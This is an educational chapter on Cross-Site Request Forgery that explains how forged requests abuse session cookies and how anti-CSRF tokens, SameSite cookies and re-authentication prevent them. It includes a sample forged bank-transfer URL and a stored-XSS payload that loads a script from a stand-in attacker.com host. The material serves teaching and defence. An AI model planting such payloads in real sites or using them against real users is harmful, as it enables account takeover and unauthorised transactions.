# 10 - Cross-Site Request Forgery (CSRF)


## 1. What is Cross-Site Request Forgery (CSRF)?

**CSRF** (also pronounced "sea-surf") is an attack that forces an end user to execute unwanted actions on a web application in which they are currently logged in.

*   **Core Idea:** The attack exploits the trust that a web application has in a user's browser. When a request is sent to an application, the browser automatically includes any relevant authentication cookies for that domain. A CSRF attack tricks the browser into sending a forged, state-changing request (like changing a password or transferring money) without the user's knowledge or consent. The application, seeing the valid session cookie, processes the request as if it were legitimate.

*   **Analogy:** Imagine you are logged into your online banking website. An attacker sends you an email with a hidden link or an image. When your browser loads the email, it also loads the hidden image, which has a source like `http://yourbank.com/transfer?to=attacker&amount=1000`. Because you are logged into your bank, your browser helpfully attaches your session cookie to this request. The bank's server sees a valid request from a logged-in user and processes the transfer. You have just been a victim of a CSRF attack.

---

## 2. How CSRF Attacks are Executed

The attacker's goal is to get a victim's browser to send a forged HTTP request to the vulnerable application.

*   **The Victim:** Must be authenticated to the target web application.
*   **The Malicious Request:** The attacker crafts a request that performs a sensitive action (e.g., changing an email address, deleting a user, posting a comment).
*   **The Delivery:** The attacker embeds this forged request into a website or email they control. This can be done via:
    *   An `<img>` tag with a malicious `src` attribute.
    *   A hyperlink (`<a>` tag).
    *   A form that is auto-submitted with JavaScript.
*   **Combining with XSS:** A **Stored XSS** vulnerability provides a perfect delivery mechanism for a CSRF attack. An attacker can inject a JavaScript payload that performs the forged request. This payload will then execute in the browser of every authenticated user who visits the vulnerable page.

### Example XSS Payload for CSRF
An attacker could use a Stored XSS vulnerability to inject a script that remotely loads and executes their malicious JavaScript.
```html
"><script src="https://attacker.com/exploit.js"></script>
```
The `exploit.js` file would contain the JavaScript code necessary to craft and send the forged request to change the victim's password.

---

## 3. Prevention

Preventing CSRF involves breaking the application's blind trust in the requests sent by a user's browser. The server needs a way to verify that a state-changing request was intentionally submitted by the user from the application's own interface.

### Primary Defenses
*   **Anti-CSRF Tokens (The Best Defense):**
    *   **How it Works:** For every user session, the server generates a unique, random, and unpredictable token. This token is embedded in a hidden field in all sensitive forms (like a "change password" form). When the user submits the form, the token is sent back to the server. The server validates that the token received matches the one it issued for that session.
    *   **Effectiveness:** An attacker cannot guess this token, so any forged request they create will be missing the valid token and will be rejected by the server. This is the most robust defense.

### Defense-in-Depth Measures
*   **SameSite Cookie Attribute:**
    *   A browser-level defense. Setting a cookie's `SameSite` attribute to `Strict` or `Lax` instructs the browser **not** to send the cookie with cross-site requests, effectively neutralizing most CSRF attacks. `Strict` is the most secure.
*   **Re-authentication:** For highly sensitive actions (like changing a password or email address), require the user to re-enter their current password to confirm their intent.
*   **Input Validation & Sanitization:** While the primary defense for XSS and HTML Injection, proper validation (e.g., checking the `Referer` header, though it can be spoofed) can add another layer of protection.
